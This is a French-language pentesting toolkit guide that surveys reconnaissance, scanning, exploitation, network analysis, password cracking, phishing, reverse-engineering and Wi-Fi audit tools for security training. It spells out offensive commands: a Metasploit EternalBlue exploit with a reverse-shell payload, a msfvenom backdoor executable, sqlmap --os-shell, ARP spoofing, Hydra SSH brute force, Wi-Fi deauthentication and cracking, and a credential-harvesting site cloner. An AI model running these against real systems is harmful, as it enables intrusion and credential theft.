Kit de Pentesting

Table des matières :
1. Outils de reconnaissance
2. Outils de scan de vulnérabilités
3. Outils d'exploitation
4. Outils d'analyse réseau
5. Outils de craquage de mots de passe
6. Outils d'ingénierie sociale
7. Outils d'analyse de code et de rétro-ingénierie
8. Outils pour les tests d'intrusion sans fil
9. Outils de reporting
10. Systèmes d'exploitation pour le pentesting

1. Outils de reconnaissance

1.1 Nmap : Scanner de ports et de réseau

Nmap (Network Mapper) est un outil essentiel pour la découverte de réseau et l'audit de sécurité.

Fonctionnalités principales :
- Découverte d'hôtes actifs
- Scan de ports
- Détection de services et de versions
- Détection de système d'exploitation
- Scripting avec NSE (Nmap Scripting Engine)

Utilisation basique :

nmap [options] <cible>


Techniques de scan courantes :
- SYN Scan : `nmap -sS <cible>`
- TCP Connect Scan : `nmap -sT <cible>`
- UDP Scan : `nmap -sU <cible>`
- Version Scanning : `nmap -sV <cible>`
- OS Detection : `nmap -O <cible>`

Exemples avancés :
a) Scan furtif avec fragmentation de paquets :

nmap -f -sS -p- 192.168.1.1


b) Scan avec scripts NSE pour la détection de vulnérabilités :

nmap --script vuln 192.168.1.1


c) Scan de réseau avec export XML :

nmap -sV -p1-65535 -oX scan_results.xml 192.168.1.0/24



1.2 Recon-ng : Framework de reconnaissance

Recon-ng est un framework puissant pour la reconnaissance automatisée.

Caractéristiques :
- Interface similaire à Metasploit
- Modules pour diverses sources d'information
- Stockage des résultats dans une base de données

Utilisation de base :
a) Lancement de Recon-ng :
recon-ng


b) Utilisation d'un module :
use recon/domains-hosts/google_site_web
set SOURCE example.com
run


c) Affichage des résultats :
show hosts


1.3 theHarvester : Collecte d'informations open source

theHarvester est un outil pour collecter des e-mails, sous-domaines, noms d'hôtes, et plus encore à partir de sources publiques.

Utilisation :
theHarvester -d example.com -l 500 -b google,bing,linkedin


Options importantes :
- `-d` : domaine cible
- `-l` : limite de résultats
- `-b` : sources de données (moteurs de recherche, API)

1.4 Maltego : Outil de visualisation de liens pour OSINT

Maltego est un outil puissant pour la collecte et la visualisation d'informations de sources ouvertes (OSINT).

Caractéristiques :
- Interface graphique intuitive
- Transformations pour automatiser la collecte de données
- Visualisation des relations entre les entités

Utilisation typique :
1. Créer un nouveau graphe
2. Ajouter une entité (ex: domaine)
3. Appliquer des transformations pour découvrir des informations liées
4. Analyser les relations et les patterns dans le graphe résultant

2. Outils de scan de vulnérabilités

2.1 OpenVAS : Scanner de vulnérabilités open source

OpenVAS (Open Vulnerability Assessment System) est une suite complète pour l'évaluation des vulnérabilités.

Caractéristiques :
- Plus de 50 000 tests de vulnérabilités
- Interface web pour la gestion des scans
- Mises à jour régulières de la base de données de vulnérabilités

Installation sur Kali Linux :
apt-get update
apt-get install openvas
openvas-setup


Utilisation via l'interface web :
1. Accéder à https://[IP]:9392
2. Créer une nouvelle tâche de scan
3. Définir la cible et les options de scan
4. Lancer le scan et analyser les résultats

2.2 Nessus : Scanner de vulnérabilités professionnel

Nessus est l'un des scanners de vulnérabilités les plus utilisés dans l'industrie.

Versions :
- Nessus Essentials (gratuit pour usage personnel)
- Nessus Professional (payant)

Caractéristiques clés :
- Interface utilisateur intuitive
- Large base de données de vulnérabilités
- Plugins personnalisables
- Rapports détaillés et personnalisables

Processus typique d'utilisation :
1. Configurer un nouveau scan
2. Définir la portée et les options
3. Lancer le scan
4. Analyser les résultats et générer des rapports

2.3 Nikto : Scanner de vulnérabilités web

Nikto est un scanner open source spécialisé dans la détection de vulnérabilités des applications web.

Utilisation de base :
nikto -h http://example.com


Options utiles :
- `-ssl` : pour les sites HTTPS
- `-Tuning` : pour cibler des types spécifiques de tests
- `-output` : pour sauvegarder les résultats dans un fichier

Exemple avancé :
 nikto -h http://example.com -ssl -Tuning 123bde -output nikto_results.html

 
2.4 OWASP ZAP : Proxy d'interception et scanner web

OWASP Zed Attack Proxy (ZAP) est un outil polyvalent pour les tests de sécurité des applications web.

Fonctionnalités principales :
- Proxy d'interception
- Scanner automatique
- Spider pour la découverte de contenu
- Fuzzer pour les tests d'injection

Utilisation typique :
1. Configurer le navigateur pour utiliser ZAP comme proxy
2. Naviguer sur le site cible pour capturer le trafic
3. Lancer un scan automatique
4. Utiliser les outils manuels (fuzzer, repeater) pour des tests approfondis

[Fin de la Partie 1]


3. Outils d'exploitation

3.1 Metasploit Framework

Metasploit est l'un des frameworks d'exploitation les plus puissants et les plus utilisés dans le domaine de la sécurité informatique.

Caractéristiques principales :
- Large base de données d'exploits
- Génération de payloads
- Post-exploitation
- Scripting Ruby pour la personnalisation

Utilisation de base :

a) Lancement de la console Metasploit :
msfconsole

b) Recherche d'exploits :
search <nom_de_la_vulnérabilité>

c) Utilisation d'un exploit :
use <chemin_de_l'exploit>

d) Configuration des options :
show options
set RHOSTS <adresse_IP_cible>
set LHOST <adresse_IP_attaquant>

e) Exécution de l'exploit :
exploit

Exemple d'utilisation avancée - Exploitation d'EternalBlue :
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
exploit

Création de payloads personnalisés avec msfvenom :
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > payload.exe

3.2 BeEF (Browser Exploitation Framework)

BeEF est un outil puissant pour l'exploitation des navigateurs web.

Fonctionnalités :
- Hook de navigateurs
- Interface web pour le contrôle
- Modules d'exploitation variés

Utilisation de base :
1. Démarrer BeEF :
beef-xss

2. Injecter le script hook dans la page web cible
3. Attendre que les navigateurs se connectent
4. Utiliser l'interface web pour lancer des attaques

3.3 SQLmap : Outil d'exploitation d'injection SQL automatisé

SQLmap est un outil open source pour la détection et l'exploitation des vulnérabilités d'injection SQL.

Caractéristiques :
- Détection automatique du type de base de données
- Techniques d'injection avancées
- Extraction de données
- Prise de contrôle du système d'exploitation

Exemple d'utilisation basique :
sqlmap -u "http://example.com/page.php?id=1" --dbs

Options avancées :
- --os-shell : pour obtenir un shell sur le système
- --dump : pour extraire le contenu de la base de données
- --risk=3 --level=5 : pour des tests plus agressifs

4. Outils d'analyse réseau

4.1 Wireshark : Analyseur de protocoles réseau

Wireshark est l'outil de référence pour l'analyse approfondie du trafic réseau.

Fonctionnalités clés :
- Capture en temps réel
- Analyse détaillée des paquets
- Filtres puissants
- Support de centaines de protocoles

Utilisation de base :
1. Sélectionner une interface réseau
2. Démarrer la capture
3. Appliquer des filtres (ex: http.request.method == "POST")
4. Analyser les paquets capturés

Techniques avancées :
- Suivre les flux TCP/UDP
- Utiliser des dissecteurs de protocoles personnalisés
- Extraire des fichiers à partir des captures

4.2 tcpdump : Outil en ligne de commande pour la capture de paquets

tcpdump est un outil puissant et léger pour la capture et l'analyse de paquets en ligne de commande.

Exemple d'utilisation :
tcpdump -i eth0 -n 'tcp port 80'

Options utiles :
- -w file.pcap : pour sauvegarder la capture dans un fichier
- -r file.pcap : pour lire une capture existante
- -A : pour afficher le contenu ASCII des paquets

4.3 Bettercap : Framework pour attaques MITM

Bettercap est un outil polyvalent pour les attaques de type "Man in the Middle" (MITM).

Fonctionnalités :
- Sniffing de réseau
- Spoofing ARP/DNS
- Injection de code dans les pages web
- Attaques sur les réseaux Wi-Fi

Exemple d'utilisation pour l'ARP spoofing :
sudo bettercap -iface eth0
net.probe on
set arp.spoof.targets 192.168.1.10
arp.spoof on

5. Outils de craquage de mots de passe

5.1 John the Ripper

John the Ripper est un outil de craquage de mots de passe rapide et flexible.

Modes de craquage :
- Attaque par dictionnaire
- Attaque par force brute
- Attaque basée sur des règles

Utilisation de base :
john --wordlist=dictionnaire.txt hashes.txt

Options avancées :
- --rules : pour appliquer des règles de mutation
- --incremental : pour une attaque par force brute
- --format=<format> : pour spécifier le format de hash

5.2 Hashcat : Outil de craquage GPU-accéléré

Hashcat est l'outil de craquage de mots de passe le plus rapide, utilisant la puissance des GPU.

Caractéristiques :
- Support de nombreux types de hash
- Modes d'attaque variés
- Utilisation optimisée des GPU

Exemple d'utilisation :
hashcat -m 0 -a 0 hashes.txt wordlist.txt

Modes d'attaque :
- -a 0 : Attaque par dictionnaire
- -a 1 : Attaque combinatoire
- -a 3 : Attaque par masque (brute-force)

5.3 Hydra : Outil d'attaque par force brute en ligne

Hydra est un outil polyvalent pour les attaques par force brute sur divers protocoles réseau.

Protocoles supportés :
- SSH, FTP, HTTP(S), SMB, et bien d'autres

Exemple d'utilisation pour une attaque SSH :
hydra -l user -P wordlist.txt ssh://192.168.1.10

Options utiles :
- -t : pour définir le nombre de tâches parallèles
- -f : pour arrêter après avoir trouvé un login valide
- -v : pour le mode verbeux


6. Outils d'ingénierie sociale

6.1 Social-Engineer Toolkit (SET)

SET est un framework open-source conçu pour l'ingénierie sociale dans le cadre de tests de pénétration.

Fonctionnalités principales :
- Attaques par phishing
- Création de sites web malveillants
- Génération de payloads
- Attaques par clé USB

Utilisation de base :
1. Lancer SET :
setoolkit

2. Choisir le type d'attaque (ex: 1 pour les attaques par ingénierie sociale)
3. Sélectionner la méthode spécifique (ex: 2 pour les attaques par site web)
4. Suivre les instructions pour configurer l'attaque

Exemple d'attaque par phishing :
1) Social-Engineering Attacks
2) Website Attack Vectors
3) Credential Harvester Attack Method
2) Site Cloner
set:webattack> Entrez l'URL à cloner: http://example.com
set:webattack> Entrez l'adresse IP d'écoute: 192.168.1.100

6.2 Gophish : Framework de phishing open source

Gophish est un outil puissant pour créer et gérer des campagnes de phishing simulées.

Caractéristiques :
- Interface web intuitive
- Création de landing pages personnalisées
- Suivi des campagnes en temps réel
- Rapports détaillés

Utilisation :
1. Lancer Gophish :
./gophish

2. Accéder à l'interface web (par défaut : https://localhost:3333)
3. Créer une nouvelle campagne :
   - Définir les cibles
   - Créer un modèle d'e-mail
   - Configurer la landing page
   - Planifier l'envoi
4. Lancer la campagne et suivre les résultats

7. Outils d'analyse de code et de rétro-ingénierie

7.1 IDA Pro : Désassembleur et débogueur

IDA Pro est un outil de rétro-ingénierie avancé utilisé pour l'analyse de binaires.

Fonctionnalités :
- Désassemblage multi-architectures
- Débogage interactif
- Analyse de code source
- Support de plugins

Utilisation de base :
1. Ouvrir un binaire dans IDA Pro
2. Analyser le code désassemblé
3. Utiliser le graphe de flux de contrôle pour la visualisation
4. Ajouter des commentaires et renommer les variables/fonctions

Exemple de commande pour le débogage :
ida -r dbg_script.py executable.exe

7.2 Ghidra : Outil de rétro-ingénierie de la NSA

Ghidra est un outil open-source de rétro-ingénierie développé par la NSA.

Caractéristiques :
- Interface graphique conviviale
- Désassembleur et décompilateur
- Analyse de code multi-plateforme
- Extensible via des scripts

Utilisation :
1. Lancer Ghidra :
./ghidraRun

2. Créer un nouveau projet
3. Importer le binaire à analyser
4. Utiliser le CodeBrowser pour explorer le code désassemblé/décompilé

Exemple de script Ghidra (en Python) :
def analyze_function():
    function = getCurrentFunction()
    print("Analyzing function: " + function.getName())
    # Ajouter ici la logique d'analyse personnalisée

7.3 JADX : Décompilateur pour Android

JADX est un outil pour décompiler les applications Android (APK) en code source Java.

Fonctionnalités :
- Décompilation d'APK en Java
- Interface graphique et ligne de commande
- Génération de fichiers Gradle pour la reconstruction

Utilisation en ligne de commande :
jadx app.apk -d output_directory

Utilisation de l'interface graphique :
jadx-gui app.apk

8. Outils pour les tests d'intrusion sans fil

8.1 Aircrack-ng : Suite pour l'audit de réseaux Wi-Fi

Aircrack-ng est une suite complète d'outils pour évaluer la sécurité des réseaux Wi-Fi.

Composants principaux :
- airmon-ng : Gestion du mode moniteur
- airodump-ng : Capture de paquets
- aireplay-ng : Injection de paquets
- aircrack-ng : Craquage de clés WEP/WPA

Exemple d'utilisation pour capturer des handshakes WPA :
1. Mettre l'interface en mode moniteur :
airmon-ng start wlan0

2. Capturer les paquets :
airodump-ng -c 1 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

3. Déauthentifier un client pour forcer un handshake :
aireplay-ng -0 1 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

4. Cracker le handshake capturé :
aircrack-ng -w wordlist.txt capture-01.cap

8.2 Kismet : Détecteur de réseaux sans fil passif

Kismet est un sniffer de réseau, un détecteur d'intrusion et un outil de cartographie pour réseaux Wi-Fi.

Fonctionnalités :
- Détection passive de réseaux
- Logging et analyse de paquets
- Support de multiples sources de capture

Utilisation de base :
1. Lancer Kismet :
kismet

2. Configurer les sources de capture
3. Analyser les réseaux détectés via l'interface web

Exemple de configuration de source dans kismet.conf :
source=wlan0:name=MainWifi,hop=true,channel=1,2,3,4,5,6

9. Outils de reporting

9.1 Dradis : Plateforme de reporting collaborative

Dradis est un outil open-source pour la collaboration et le reporting dans les tests d'intrusion.

Caractéristiques :
- Centralisation des notes et résultats
- Génération de rapports personnalisables
- Intégration avec d'autres outils (Nmap, Burp, etc.)

Installation et lancement :
bundle install
bundle exec rails server

Utilisation via l'interface web :
1. Accéder à http://localhost:3000
2. Créer un nouveau projet
3. Importer les résultats des scans
4. Collaborer sur les notes
5. Générer le rapport final

9.2 MagicTree : Outil de prise de notes et de reporting

MagicTree est un outil de reporting pour les tests de pénétration avec une structure arborescente.

Fonctionnalités :
- Organisation hiérarchique des données
- Import automatique depuis divers outils
- Génération de rapports en HTML et XML

Lancement de MagicTree :
java -jar magictree.jar

Utilisation :
1. Créer une nouvelle arborescence
2. Importer les résultats des scans
3. Organiser et annoter les données
4. Générer le rapport final

10. Systèmes d'exploitation pour le pentesting

10.1 Kali Linux : Distribution Linux orientée sécurité

Kali Linux est une distribution basée sur Debian, spécialement conçue pour les tests de pénétration et l'audit de sécurité.

Caractéristiques :
- Plus de 600 outils préinstallés
- Mises à jour régulières
- Personnalisable et compatible ARM

Installation :
1. Télécharger l'ISO depuis https://www.kali.org/
2. Créer une clé USB bootable ou installer dans une VM
3. Booter sur Kali et suivre l'assistant d'installation

Mise à jour de Kali :
sudo apt update && sudo apt full-upgrade -y

10.2 Parrot Security OS : Alternative à Kali avec des outils supplémentaires

Parrot Security OS est une distribution basée sur Debian focalisée sur la sécurité, le développement et la confidentialité.

Fonctionnalités :
- Outils de sécurité et de développement
- Environnement de bureau léger
- Mode anonymat intégré (AnonSurf)

Installation :
1. Télécharger l'ISO depuis https://www.parrotsec.org/
2. Créer un média d'installation bootable
3. Installer en suivant l'assistant

Utilisation d'AnonSurf pour l'anonymat :
sudo anonsurf start

Ces systèmes d'exploitation fournissent un environnement complet et préconfiguré pour les tests de pénétration, facilitant l'accès et l'utilisation des nombreux outils présentés dans ce guide.


